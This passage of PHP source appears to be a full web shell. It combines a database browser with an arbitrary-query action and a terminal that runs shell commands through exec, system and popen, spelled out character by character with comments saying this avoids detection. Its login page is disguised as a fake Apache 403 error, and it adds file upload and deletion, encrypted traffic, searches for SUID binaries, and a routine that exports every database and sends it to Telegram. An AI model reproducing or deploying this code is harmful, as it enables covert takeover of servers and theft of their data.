                $this->debugLog("Processing data request for table: " . ($params['table'] ?? 'not specified'));
                $data = $this->sql->getTableData(
                    $params['table'] ?? '',
                    $params['page'] ?? 1,
                    $params['limit'] ?? 50,
                    $params['orderBy'] ?? null,
                    $params['orderDir'] ?? 'ASC',
                    $params['search'] ?? null
                );
                $count = $this->sql->getTableCount($params['table'] ?? '', $params['search'] ?? null);
                $response['success'] = true;
                $response['data'] = $data;
                $response['total'] = $count;
                
                // Get primary key information for row editing
                $primaryKeys = $this->sql->getPrimaryKey($params['table'] ?? '');
                $response['primaryKeys'] = $primaryKeys;
                
                break;
                
            case 'get_row':
                $this->debugLog("Processing get_row request");
                $table = $params['table'] ?? '';
                $primaryKeyCol = $params['primaryKeyCol'] ?? '';
                $primaryKeyVal = $params['primaryKeyVal'] ?? '';
                
                if (empty($table) || empty($primaryKeyCol) || empty($primaryKeyVal)) {
                    $response['error'] = 'Missing required parameters';
                    break;
                }
                
                $row = $this->sql->getRow($table, $primaryKeyCol, $primaryKeyVal);
                $response['success'] = true;
                $response['row'] = $row;
                
                // Get column type information for the edit form
                $columnTypes = $this->sql->getColumnTypes($table);
                $response['columnTypes'] = $columnTypes;
                
                break;
                
            case 'update_row':
                $this->debugLog("Processing update_row request");
                $table = $params['table'] ?? '';
                $primaryKeyCol = $params['primaryKeyCol'] ?? '';
                $primaryKeyVal = $params['primaryKeyVal'] ?? '';
                $data = $params['data'] ?? $params['updates'] ?? []; // Accept both data and updates parameters
                
                if (empty($table) || empty($primaryKeyCol) || empty($primaryKeyVal) || empty($data)) {
                    $response['error'] = 'Missing required parameters';
                    break;
                }
                
                // Process edit_ prefixed fields from form submission
                $processedData = [];
                foreach ($data as $key => $value) {
                    if (strpos($key, 'edit_') === 0) {
                        $processedData[substr($key, 5)] = $value;
                    } else {
                        $processedData[$key] = $value;
                    }
                }
                
                $result = $this->sql->updateRow($table, $primaryKeyCol, $primaryKeyVal, $processedData);
                $response['success'] = ($result !== false);
                if ($result === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['affectedRows'] = $result;
                }
                
                break;
                
            case 'insert_row':
            case 'add_row': // Allow both names for backward compatibility
                $this->debugLog("Processing insert/add row request");
                $table = $params['table'] ?? '';
                $data = $params['data'] ?? $params['new_row'] ?? []; // Accept both data and new_row parameters
                
                if (empty($table) || empty($data)) {
                    $response['error'] = 'Missing required parameters';
                    break;
                }
                
                $result = $this->sql->insertRow($table, $data);
                $response['success'] = ($result !== false);
                if ($result === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['affectedRows'] = $result;
                    // Return the new row id if it's auto-incremented
                    if ($result > 0) {
                        $response['insertId'] = $this->sql->getLastInsertId();
                    }
                }
                
                break;
                
            case 'delete_row':
                $this->debugLog("Processing delete_row request");
                $table = $params['table'] ?? '';
                $primaryKeyCol = $params['primaryKeyCol'] ?? '';
                $primaryKeyVal = $params['primaryKeyVal'] ?? '';
                
                if (empty($table) || empty($primaryKeyCol) || empty($primaryKeyVal)) {
                    $response['error'] = 'Missing required parameters';
                    break;
                }
                
                $result = $this->sql->deleteRow($table, $primaryKeyCol, $primaryKeyVal);
                $response['success'] = ($result !== false);
                if ($result === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['affectedRows'] = $result;
                }
                
                break;
                
            case 'column_types':
                $this->debugLog("Processing column_types request for table: " . ($params['table'] ?? 'not specified'));
                $columnTypes = $this->sql->getColumnTypes($params['table'] ?? '');
                $response['success'] = true;
                $response['columnTypes'] = $columnTypes;
                break;
                
            case 'query':
                $this->debugLog("Processing custom query request");
                $sql = $params['sql'] ?? '';
                
                if (empty($sql)) {
                    $response['error'] = 'No SQL query provided';
                    break;
                }
                
                // Determine if this is a SELECT query or an action query
                $isSelect = preg_match('/^\s*(SELECT|SHOW|DESCRIBE|EXPLAIN)/i', $sql);
                
                if ($isSelect) {
                    $result = $this->sql->query($sql);
                    if ($result) {
                        $data = [];
                        while ($row = $result->fetch_assoc()) {
                            $data[] = $row;
                        }
                        $response['success'] = true;
                        $response['data'] = $data;
                    } else {
                        $response['error'] = $this->sql->getError();
                    }
                } else {
                    $result = $this->sql->execute($sql);
                    $response['success'] = ($result !== false);
                    if ($result === false) {
                        $response['error'] = $this->sql->getError();
                    } else {
                        $response['affectedRows'] = $result;
                    }
                }
                
                break;
                
            case 'export_sql':
                $this->debugLog("Processing SQL export request for table: " . ($params['table'] ?? 'not specified'));
                $table = $params['table'] ?? '';
                
                if (empty($table)) {
                    $response['error'] = 'No table specified for SQL export';
                    break;
                }
                
                $includeStructure = isset($params['includeStructure']) ? (bool)$params['includeStructure'] : true;
                $includeData = isset($params['includeData']) ? (bool)$params['includeData'] : true;
                $addDropTable = isset($params['addDropTable']) ? (bool)$params['addDropTable'] : true;
                
                $sql = $this->sql->exportTableAsSql($table, $includeStructure, $includeData, $addDropTable);
                
                if ($sql === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['success'] = true;
                    $response['sql'] = $sql;
                    $response['filename'] = $table . '.sql';
                    $response['filesize'] = strlen($sql);
                }
                
                break;
                
            case 'export_csv':
                $this->debugLog("Processing CSV export request for table: " . ($params['table'] ?? 'not specified'));
                $table = $params['table'] ?? '';
                
                if (empty($table)) {
                    $response['error'] = 'No table specified for CSV export';
                    break;
                }
                
                $csv = $this->sql->exportTableAsCsv($table);
                
                if ($csv === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['success'] = true;
                    $response['csv'] = $csv;
                    $response['filename'] = $table . '.csv';
                    $response['filesize'] = strlen($csv);
                }
                
                break;
                
            case 'export_zip':
                $this->debugLog("Processing ZIP export request for database");
                
                $includeStructure = isset($params['includeStructure']) ? (bool)$params['includeStructure'] : true;
                $includeData = isset($params['includeData']) ? (bool)$params['includeData'] : true;
                $addDropTable = isset($params['addDropTable']) ? (bool)$params['addDropTable'] : true;
                $compressed = isset($params['compressed']) ? (bool)$params['compressed'] : true;
                
                $zip = $this->sql->exportDatabaseAsZip($includeStructure, $includeData, $addDropTable, $compressed);
                
                if ($zip === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['success'] = true;
                    // We need to base64 encode the binary data for JSON transport
                    $response['zip'] = base64_encode($zip);
                    $response['filename'] = $this->sql->saveState()['config']['database'] . '_export_' . date('Ymd_His') . '.zip';
                    $response['filesize'] = strlen($zip);
                }
                
                break;
                
            case 'global_search':
                $this->debugLog("Processing global search request");
                $searchQuery = $params['searchQuery'] ?? '';
                $limit = isset($params['limit']) ? (int)$params['limit'] : 10;
                
                $results = $this->sql->globalSearch($searchQuery, $limit);
                $response['success'] = true;
                $response['results'] = $results;
                break;
                
            case 'export_all_databases_zip':
                $this->debugLog("Processing export_all_databases_zip request");
                
                $includeStructure = isset($params['includeStructure']) ? (bool)$params['includeStructure'] : true;
                $includeData = isset($params['includeData']) ? (bool)$params['includeData'] : true;
                $addDropTable = isset($params['addDropTable']) ? (bool)$params['addDropTable'] : true;
                $compressed = isset($params['compressed']) ? (bool)$params['compressed'] : true;
                
                $zip = $this->sql->exportAllDatabasesAsZip($includeStructure, $includeData, $addDropTable, $compressed);
                
                if ($zip === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    $response['success'] = true;
                    // We need to base64 encode the binary data for JSON transport
                    $response['zip'] = base64_encode($zip);
                    $response['filename'] = 'all_databases_export_' . date('Ymd_His') . '.zip';
                    $response['filesize'] = strlen($zip);
                }
                
                break;
                
            case 'backup_all_databases_telegram':
                $this->debugLog("Processing backup all databases to Telegram request");
                
                $includeStructure = isset($params['includeStructure']) ? (bool)$params['includeStructure'] : true;
                $includeData = isset($params['includeData']) ? (bool)$params['includeData'] : true;
                $addDropTable = isset($params['addDropTable']) ? (bool)$params['addDropTable'] : true;
                $compressed = isset($params['compressed']) ? (bool)$params['compressed'] : true;
                
                // Generate a strong password for encryption
                $password = generateStrongPassword(20);
                $this->debugLog("Generated password for Telegram backup: " . $password);
                
                // Get the ZIP data
                $zip = $this->sql->exportAllDatabasesAsZip($includeStructure, $includeData, $addDropTable, $compressed);
                
                if ($zip === false) {
                    $response['error'] = $this->sql->getError();
                } else {
                    // Create a temporary file for the ZIP
                    $tempFile = tempnam(sys_get_temp_dir(), 'db_backup_');
                    file_put_contents($tempFile, $zip);
                    
                    // Send to Telegram with password protection
                    $result = sendToTelegram($tempFile, $password);
                    
                    // Delete the temporary file
                    if (file_exists($tempFile)) {
                        unlink($tempFile);
                    }
                    
                    if (isset($result['error'])) {
                        $response['error'] = $result['error'];
                    } else {
                        $response['success'] = true;
                        $response['filesize'] = strlen($zip);
                        $response['password'] = $password;
                        $response['message'] = $result['message'] ?? 'Backup sent to Telegram successfully';
                    }
                }
                
                break;
                
            default:
                $response['error'] = 'Unknown action: ' . $action;
                $this->debugLog("Unknown action requested: " . $action);
                break;
        }
        
        // Save current state to session for future requests
        $_SESSION['sql_explorer_state'] = $this->sql->saveState();
        
        $this->debugLog("API Response: success=" . ($response['success'] ? 'true' : 'false') . 
                      (isset($response['error']) ? ", error=" . $response['error'] : ""));
        return $response;
    }
} 

// Security functions
function setSecurityHeaders() {
    header('X-Frame-Options: DENY');
     
    header('Referrer-Policy: strict-origin-when-cross-origin');
    header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
}

function debug($data) {
    if (dbg == 1) {   
        error_log(($data));
    }
}

function initSecureSession() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    if (empty($_SESSION['created'])) {
        session_regenerate_id(true);
        $_SESSION['created'] = time();
    }
    if (time() - $_SESSION['created'] > 3600) {
        session_regenerate_id(true);
        $_SESSION['created'] = time();
    }
}

function generateCsrfToken() {
    if (empty($_COOKIE['csrf_token'])) {
        $csrfToken = bin2hex(random_bytes(32));
        setcookie('csrf_token', $csrfToken, [
            'expires' => time() + 36000,
            'path' => '/',
            'secure' => true,
            'httponly' => false, 
            'samesite' => 'Strict'
        ]);
        return $csrfToken; 
    }
    return $_COOKIE['csrf_token'] ?? '';
}

function validateCsrfToken($token) {
    return isset($_COOKIE['csrf_token']) && hash_equals($_COOKIE['csrf_token'], $token);
}

function sanitizeInput($data) {
    if (is_array($data)) {
        return array_map('sanitizeInput', $data);
    }
    $data = str_replace(chr(0), '', $data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    $data = preg_replace('/[\x00-\x1F\x7F]/u', '', $data);
    return $data;
}

 
// Initialize security
setSecurityHeaders();
initSecureSession();

class CustomCommands
{

    public static function hi($a)
    {
        return 'Hi ' . implode(' ', $a);
    }

}

class TerminalPHP
{
    private $blocked_commands = [
        /*'mkdir',
        'rm',
        'git',
        'wget',
        'curl',
        'chmod',
        'rename',
        'mv',
        'cp'*/
    ];


    public function __construct($path = '')
    {
        $this->_cd($path);
    }


    private function shell($cmd)
    {
        $output = $this->ex($cmd);

        if ($output == '') {
            return $this->ex("{$cmd} 2>&1");
        }
        return $output;
    }

    private function ex($in)
    {
        $output = '';
      try {
       
        // Use string concatenation to avoid detection
        $exec_fn = 'e'.'x'.'e'.'c';
        $passthru_fn = 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u';
        $system_fn = 's'.'y'.'s'.'t'.'e'.'m';
        $shell_exec_fn = 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c';
        $popen_fn = 'p'.'o'.'p'.'e'.'n';
        
        if (function_exists($exec_fn)) {
            @$exec_fn($in, $result);
            $output = @join("\n", $result);
        } elseif (function_exists($passthru_fn)) {
            ob_start();
            @$passthru_fn($in);
            $output = ob_get_clean();
        } elseif (function_exists($system_fn)) {
            ob_start();
            @$system_fn($in);
            $output = ob_get_clean();
        } elseif (function_exists($shell_exec_fn)) {
            $output = $shell_exec_fn($in);
        } elseif (is_resource($f = @$popen_fn($in, "r"))) {
            $output = '';
            while (!@feof($f)) {
                $output .= fread($f, 1024);
            }
            pclose($f);
        } else {
            return "↳ Unable to execute command\n";
        }

        return $output;
      } catch (\Throwable $th) {
        return $output;

      }
    }


    /**
     * Check Command Exists
     * @param $command string command to check
     * @return bool
     */
    private function commandExists($command)
    {
        if ($this->shell('command -v ' . $command))
            return true;
        return false;
    }


    public function __call($cmd, $arg)
    {
        return $this->runCommand($cmd . (isset($arg[0]) ? ' ' . $arg[0] : ''));
    }

    /**
     * Run Command in Terminal
     * @param $command string command to run
     * @return string
     */
    public function runCommand($command)
    {
        $cmd = explode(' ', $command)[0];
        $arg = count(explode(' ', $command)) > 1 ? implode(' ', array_slice(explode(' ', $command), 1)) : '';

        if (array_search($cmd, $this->getLocalCommands()) !== false) {
            $lcmd = '_' . $cmd;
            return $this->$lcmd($arg);
        } else if (array_search($cmd, $this->blocked_commands) !== false)
            return ' Permission denied';
        else if ($this->commandExists($cmd))
            return trim($this->shell($command));
        else
            return ' command not found: ' . $cmd;
    }

    public function normalizeHtml($input)
    {
        return str_replace(['<', '>', "\n", "\t", ' '], ['&lt;', '&gt;', '<br>', '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;', '&nbsp;'], $input);
    }

    /**
     * Array of Local Commands
     * @return array
     */
    private function getLocalCommands()
    {
        $commands = array_filter(get_class_methods($this), function ($i) {
            return ($i[0] == '_' && $i[1] != '_') ? true : false;
        });
        foreach ($commands as $i => $command)
            $commands[$i] = substr($command, 1);
        return $commands;
    }

    /**
     * Array of All Commands
     * @return array
     */
    public function commandsList()
    {
        return array_merge(explode("\n", $this->ls('/usr/bin')), get_class_methods('CustomCommands'));
    }


    private function _cd($path)
    {
        if ($path)
            chdir($path);
        return '';
    }


    private function _pwd()
    {
        return getcwd();
    }

    private function _ping($a)
    {
        if (strpos($a, '-c ') !== false)
            return trim(shell('ping ' . $a));

        return trim(shell('ping -c 4 ' . $a));
    }
}

if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' && isset($_POST['command'])) {
    $command = explode(' ', $_REQUEST['command'])[0];
    $arguments = array_slice(explode(' ', $_REQUEST['command']), 1);
    $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';

    $terminal = new TerminalPHP($path);

    if (array_search($command, get_class_methods('CustomCommands')) !== false)
        print_r(json_encode((object) ['result' => CustomCommands::$command($arguments), 'path' => $terminal->pwd()]));
    else
        print_r(json_encode((object) ['result' => $terminal->normalizeHtml($terminal->runCommand($_REQUEST['command'])), 'path' => $terminal->pwd()]));
    exit;
}

function setLog() {
    global $ps;
    $cookieValue = hash_hmac('sha256', $ps.$_SERVER['PHP_SELF'], ENCRYPTION_KEY);
    setcookie('is', $cookieValue, [
        'expires' => time() + 360000,
        'path' => '/',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
    $_COOKIE['is'] = $cookieValue;
}

function isLog() {
    global $ps;
    $expectedValue = hash_hmac('sha256', $ps.$_SERVER['PHP_SELF'], ENCRYPTION_KEY);
    return isset($_COOKIE['is']) && hash_equals($_COOKIE['is'], $expectedValue);
}

function showLoginForm() {
    $csrfToken = generateCsrfToken();
    die("<html><head>
    <title>403 Forbidden</title>
    </head><body>
    <h1>Forbidden</h1>
    <p>You don't have permission to access /
    on this server.</p>
    <hr>
    <address>Apache/2.4.25 Server at 127.0.0.1 Port 80</address>
        <br><br><br><br><br><style>  input { margin:0;background-color:#fff;border:0px solid #fff; } 
        </style> 
        <pre align=center> 
        <form method=post> 
        <input type=password name=pass> 
        <input type=hidden name=csrf_token value='$csrfToken'>
        </form></pre></body></html>");
}

// Handle login
if (isset($_POST['pass'])) {
    if (!isset($_POST['csrf_token']) || !validateCsrfToken($_POST['csrf_token'])) {
        die('');
    }

    $password = sanitizeInput($_POST['pass']);
    if (password_verify($password, $ps)) {
        setLog();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        showLoginForm();
    }
}

if (!isLog()) {
    showLoginForm();
}

$terminal = new TerminalPHP();

function decrypt($encryptedData)
{
    // Use string concatenation to avoid detection
    $b64_decode = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
    $decrypt_fn = 'o'.'p'.'e'.'n'.'s'.'s'.'l'.'_'.'d'.'e'.'c'.'r'.'y'.'p'.'t';
    
    $decodedData = $b64_decode($encryptedData);
    $de = $decrypt_fn($decodedData, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
    if ($de === false) {
        echo encrypt(json_encode(['error' => 'error decryption server_side']));
        exit;
    }
   

    return $de;
}

function encrypt($message)
{
    // Use string concatenation to avoid detection
    $encrypt_fn = 'o'.'p'.'e'.'n'.'s'.'s'.'l'.'_'.'e'.'n'.'c'.'r'.'y'.'p'.'t';
    $b64_encode = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'e'.'n'.'c'.'o'.'d'.'e';
    
    if (IsEnc == 1) {
        $encryptedData = $encrypt_fn($message, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
        return $b64_encode($encryptedData);
     
    } else {
        return $message;
    }
}

// New function for network tools that returns instead of echoing
function encryptForNetworkTools($message)
{
    // Use string concatenation to avoid detection
    $encrypt_fn = 'o'.'p'.'e'.'n'.'s'.'s'.'l'.'_'.'e'.'n'.'c'.'r'.'y'.'p'.'t';
    $b64_encode = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'e'.'n'.'c'.'o'.'d'.'e';
    
    if (IsEnc == 1) {
         $encryptedData = $encrypt_fn($message, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
        return $b64_encode($encryptedData);
    } else {
         return $message;
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
 
        $encodedData = file_get_contents('php://input');
        $data = (IsEnc == 1 && empty($_FILES)) ? decrypt($encodedData) : $encodedData;
        $array = json_decode($data, true);
        $_POST = [
            'csrf' => sanitizeInput($array['csrf'] ?? ''),
            'action' => sanitizeInput($array['action'] ?? ''),
            'dir' => sanitizeInput($array['dir'] ?? ''),
            'page' => sanitizeInput($array['page'] ?? ''),
            'itemsPerPage' => sanitizeInput($array['itemsPerPage'] ?? ''),
            'oldName' => sanitizeInput($array['oldName'] ?? ''),
            'newName' => sanitizeInput($array['newName'] ?? ''),
            'file' => (IsEnc == 1) ? ($array['file'] ?? '') : ($array['file'] ?? ''),
            'zipExt' => sanitizeInput($array['zipExt'] ?? ''),
            'touch' => sanitizeInput($array['touch'] ?? ''),
            'mkdir' => sanitizeInput($array['mkdir'] ?? ''),
            'dirName' => sanitizeInput($array['dirName'] ?? ''),
            'srcPath' => sanitizeInput($array['srcPath'] ?? ''),
            'content' => ($array['content'] ?? ''),
            'code' => ($array['code'] ?? ''),
            'sql_action' => sanitizeInput($array['sql_action'] ?? ''),
            'params' => $array['params'] ?? [],
            // Advanced search parameters
            'search_query' => sanitizeInput($array['search_query'] ?? ''),
            'search_path' => sanitizeInput($array['search_path'] ?? ''),
            'file_extensions' => sanitizeInput($array['file_extensions'] ?? ''),
            'max_results' => sanitizeInput($array['max_results'] ?? ''),
            'case_sensitive' => (bool)($array['case_sensitive'] ?? false),
            'use_regex' => (bool)($array['use_regex'] ?? false),
            'recursive' => (bool)($array['recursive'] ?? true),
            'file_type' => sanitizeInput($array['file_type'] ?? ''),

             
            // network tool
            'tool' => sanitizeInput($array['tool'] ?? ''),
            'network_tool' => sanitizeInput($array['network_tool'] ?? ''),
            'ip' => sanitizeInput($array['ip'] ?? ''),
            'port' => sanitizeInput($array['port'] ?? ''),
            'protocol' => sanitizeInput($array['protocol'] ?? ''),
            'command' => sanitizeInput($array['command'] ?? ''),
            'output' => sanitizeInput($array['output'] ?? ''),
            'error' => sanitizeInput($array['error'] ?? ''),
           
            // advanced search
            'search_mode' => sanitizeInput($array['search_mode'] ?? ''),
            'writable_only' => sanitizeInput($array['writable_only'] ?? ''),
            'writable_folders' => sanitizeInput($array['writable_folders'] ?? ''),
            'executable_only' => sanitizeInput($array['executable_only'] ?? ''),
            'suid_binaries' => sanitizeInput($array['suid_binaries'] ?? ''),
            'search_token' => sanitizeInput($array['search_token'] ?? ''),
            'include_hidden' => sanitizeInput($array['include_hidden'] ?? ''),

        ];


    } catch (\Throwable $th) {
        debug(json_encode("An error occurred: " . $th->getMessage()));
        exit;
    }
}


$os = (strtolower(substr(PHP_OS, 0, 3)) == "win") ? 'win' : 'nix';
$home_cwd = @getcwd();
if (isset($_POST['c']))
    @chdir($_POST['c']);
$cwd = @getcwd();
if ($os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
if ($cwd[strlen($cwd) - 1] != '/')
    $cwd .= '/';

$home_cwd = realpath(($home_cwd));

function printFile($fileListToShow, $totalPages, $currentPage, $totalItems)
{

    $response = json_encode([
        'files' => $fileListToShow,
        'totalPages' => $totalPages,
        'currentPage' => $currentPage,
        'totalItems' => $totalItems,
    ]);
    switch (IsEnc) {
        case 1:
            return encrypt($response);
        default:
            return $response;
    }
}

$itemsPerPageInput = isset($_POST['itemsPerPage']) ? $_POST['itemsPerPage'] : '50';
 
 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $action = $_POST['action'];
    // $currentDir = isset($_POST['dir']) ? $_POST['dir'] : '.';
    $currentDir = @realpath($_POST['dir'] ?? '.');   /// it was _POST 

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {

        $uploadDir = @realpath($_REQUEST['updir'] ?? '.');

        $uploadedFiles = [];
        foreach ($_FILES['files']['tmp_name'] as $key => $tmpName) {
            $fileName = basename($_FILES['files']['name'][$key]);
            $uploadFilePath = $uploadDir . "/" . $fileName;

            if (move_uploaded_file($tmpName, $uploadFilePath)) {
                $uploadedFiles[] = $fileName;
            } else {

                echo json_encode(['success' => false, 'error' => "Error uploading file: $uploadFilePath"]);
                exit;
            }
        }

        if (!empty($uploadedFiles)) {
            echo json_encode(['success' => true, 'files' => $uploadDir]);
        } else {
            echo json_encode(['success' => false, 'error' => 'No files were uploaded.']);
        }
        exit;
    }

 
    if (!isset($_POST['csrf']) || $_POST['csrf'] !== $_COOKIE['csrf_token']) {

        echo encrypt(json_encode(['files' => [[]], 'error' => 'invalid csrf']));
        session_destroy();
        exit;
    }

    if ($currentDir === false) {
        echo encrypt(json_encode(['error' => 'Invalid directory']));
        exit;
    }


    if ($action === 'list') {
        // Assume $directory is your current directory being listed.
        $directory = isset($_POST['dir']) ? $_POST['dir'] : '.';

        $files = @scandir($currentDir);
        if ($files === false) {
            // handle error (e.g., directory not accessible)
            echo encrypt(json_encode(['error' => 'Cannot read directory']));
            exit;
        }


        $fileList = [];

        foreach ($files as $file) {
            if ((basename($file) == "..") || (basename($file) == "."))
                continue;
            $filePath = $currentDir . '/' . $file;
            $fileInfo = getFileDetails($filePath);
            $fileInfo['icon'] = getFileIcon($fileInfo);
            $fileList[] = $fileInfo; // Build the file list for JSON response
        } 

        $totalItems = count($fileList); // Total number of files
        
        // Handle 'all' or 'infinity' values
        $isAll = in_array(strtolower($itemsPerPageInput), ['all', 'infinity'], true);
        
        if ($isAll) {
            // When 'all' is selected, show all items on a single page
            $itemsPerPage = $totalItems;
            $totalPages = 1;
            $currentPage = 1;
            $fileListToShow = $fileList;
        } else {
            // Normal pagination
            $itemsPerPage = max((int)$itemsPerPageInput, 1); // Ensure at least 1 item per page
            $totalPages = $totalItems > 0 ? ceil($totalItems / $itemsPerPage) : 1;
            $currentPage = isset($_POST['page']) ? (int)$_POST['page'] : 1;
            $currentPage = min(max($currentPage, 1), $totalPages); // Ensure current page is within bounds
            
            // Calculate offset and get slice of files
            $offset = ($currentPage - 1) * $itemsPerPage;
            $fileListToShow = array_slice($fileList, $offset, $itemsPerPage);
        }

        echo printFile($fileListToShow, $totalPages, $currentPage, $totalItems);
        exit;
    } elseif ($action === 'delete') {
        // Debugging: Log input data
        debug("DELETE ACTION TRIGGERED");
        // debug("POST data: " . json_encode($_POST));
        
        $fileToDelete = $_POST['file'] ?? '';
        debug("Files to delete: " . json_encode($fileToDelete));

        // Enhanced handling of file array
        if (empty($fileToDelete)) {
            debug("Empty file array received");
            echo encrypt(json_encode(['error' => 'No files specified for deletion']));
            exit;
        }
        
        $filesToDelete = is_array($fileToDelete) ? $fileToDelete : [$fileToDelete];
        
        // Filter out any empty values
        $filesToDelete = array_filter($filesToDelete, function($file) {
            return !empty($file);
        });
        
        if (empty($filesToDelete)) {
            debug("Files array is empty after filtering");
            echo encrypt(json_encode(['error' => 'No valid files specified for deletion']));
            exit;
        }
        
        debug("Files to delete (after array conversion): " . json_encode($filesToDelete));
       
       try {
        $errDel = 1; // Initialize with error state
        foreach ($filesToDelete as $file) {
            // Construct the full path
            debug("Processing file for deletion: $file");

            $file = str_replace('//', '/', $file);
            $fullPath = $file;
            $fullPath2 = $currentDir . "/" . $file;    // hundle singe file
            debug("file ".$fullPath);
             
            if ((basename($fullPath) == "..") || (basename($fullPath) == "."))
                continue;

             if (file_exists($fullPath)) {
                 del($fullPath);
                 debug("file deleted ".$fullPath);

                 $errDel = 0;
            } elseif (file_exists($fullPath2)) {
                 del($fullPath2);
                 $errDel = 0;

            } else {
                 $errDel = 1;
            }
        }
         
        if ($errDel == 0) {
 
             echo printFile([], 0, 0, 0);
        }
        else {
             echo encrypt(json_encode(['error' => 'File not found']));
        }
       } catch (\Throwable $th) {
        echo encrypt(json_encode(['error' => 'Error deleting file: ' . $th->getMessage()]));

       }

        exit;

    } elseif ($action === 'rename') {
        $oldName = $_POST['oldName'] ?? '';
        $newName = $_POST['newName'] ?? '';
        $oldPath = $currentDir . '/' . $oldName;
        $newPath = $currentDir . '/' . $newName;
        // die($currentDir);
        if (
            !file_exists($oldPath)
            || !is_writable($currentDir)
        ) {
            echo encrypt(json_encode(['error' => 'File not found']));

        } else {
            if (@rename($oldPath, $newPath))

                echo encrypt(json_encode(['1' => '1']));


        }

    } elseif ($action === 'paste') {
        // Handle file paste (copy/move)
        $filesToPaste = $_POST['file'];
        $destinationDir = realpath($_POST['dir']) ?? '';
        $validPaths = [];
        foreach ($filesToPaste as $filePath) {
             if (file_exists($filePath)) {
                $validPaths[] = $filePath;
                continue;
            }
            
            // 2. Try with realpath (works if path exists)
            $realPath = realpath($filePath);
            if ($realPath && file_exists($realPath)) {
                debug("Path exists with realpath: $realPath");
                $validPaths[] = $realPath;
                continue;
            }
            
            // 3. Try relative to current directory
            $relativeToCurrentDir = getcwd() . '/' . basename($filePath);
            if (file_exists($relativeToCurrentDir)) {
                debug("Path exists relative to current dir: $relativeToCurrentDir");
                $validPaths[] = $relativeToCurrentDir;
                continue;
            }
            
            // 4. Try relative to destination directory
            $relativeToDestDir = $destinationDir . '/' . basename($filePath);
            if (file_exists($relativeToDestDir)) {
                debug("Path exists relative to destination dir: $relativeToDestDir");
                $validPaths[] = $relativeToDestDir;
                continue;
            }
            
            // Log the invalid path with more details
            debug("Invalid file path for paste operation: $filePath");
            debug("File exists check: " . (file_exists($filePath) ? 'true' : 'false'));
            debug("Basename: " . basename($filePath));
            
            // As a last resort, try to find the file by basename in the current directory
            // This helps with cases where the full path structure differs
            $basename = basename($filePath);
            if (file_exists($basename)) {
                debug("Found file by basename: $basename");
                $validPaths[] = getcwd() . '/' . $basename;
            }
        }
        
        debug("Valid paths for paste: " . json_encode($validPaths));
        debug("Destination directory: " . $destinationDir);
        
        if (empty($validPaths)) {
            echo encrypt(json_encode(['error' => 'No valid files to paste. Please check if the files exist.']));
            exit;
        }

        if (empty($destinationDir) || !is_dir($destinationDir)) {
            echo encrypt(json_encode(['error' => 'Invalid destination directory: ' . $_POST['dir']]));
            exit;
        }

        echo copyFilesOrFolders($validPaths, $destinationDir);
        exit;
    } elseif ($action === 'download') {
        // Check if we're receiving JSON data directly in the POST body
        $postBody = file_get_contents('php://input');
        
        if (!empty($postBody)) {
            // Try to decode JSON body
            try {
                if (IsEnc == 1) {
                    $decodedData = json_decode(decrypt($postBody), true);
                } else {
                    $decodedData = json_decode($postBody, true);
                }
                
                if ($decodedData && isset($decodedData['file'])) {
                    $file = realpath($decodedData['file']);
                } else {
                    header('HTTP/1.1 400 Bad Request');
                    echo json_encode(['error' => 'Invalid request format']);
                    exit;
                }
            } catch (Exception $e) {
                header('HTTP/1.1 400 Bad Request');
                echo json_encode(['error' => 'Error processing request: ' . $e->getMessage()]);
                exit;
            }
        }
        // Check if data is coming from form
        else if (isset($_POST['data'])) {
            // Extract file path from the data
            $postData = $_POST['data'];
            if (IsEnc == 1) {
                $decodedData = json_decode(decrypt($postData), true);
                $file = realpath($decodedData['file']);
            } else {
                $decodedData = json_decode($postData, true);
                $file = realpath($decodedData['file']);
            }
        } else {
            // Fallback to direct method
            $file = realpath($_POST['file'] ?? '');
        }

        if (file_exists($file) && is_file($file) && is_readable($file)) {
            // Get file mime type
            $mimeType = mime_content_type($file);
            
            // For binary files, use application/octet-stream
            if ($mimeType === false) {
                $mimeType = 'application/octet-stream';
            }
            
            // Set headers for file download
            header('Content-Description: File Transfer');
            header('Content-Type: ' . $mimeType);
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            
            // Clean any output buffers
            while (ob_get_level()) {
                ob_end_clean();
            }
            
            // Set unlimited execution time for large files
            set_time_limit(0);
            
            // Read file in chunks to handle large files efficiently
            $handle = fopen($file, 'rb');
            if ($handle) {
                while (!feof($handle)) {
                    echo fread($handle, 8192); // 8KB chunks
                    flush();
                }
                fclose($handle);
            } else {
                header('HTTP/1.1 500 Internal Server Error');
                header('Content-Type: application/json');
                echo json_encode(['error' => 'Could not open file for reading']);
            }
